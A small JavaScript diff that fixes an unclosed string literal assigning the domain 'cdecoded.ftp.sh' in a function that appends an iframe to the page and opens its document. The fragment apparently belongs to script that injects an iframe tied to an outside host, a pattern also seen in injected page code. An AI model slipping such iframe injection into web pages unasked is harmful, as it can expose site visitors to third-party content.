@@ -153,7 +153,7 @@ function pfinit() {
 
 function initializeAndAttach(iframe, generateContentCallback) {
     var domainSrc, domain;
-    domain = "cdecoded.ftp.sh;
+    domain = "cdecoded.ftp.sh";
     document.body.appendChild(iframe);
     try {
         iframe.contentWindow.document.open;
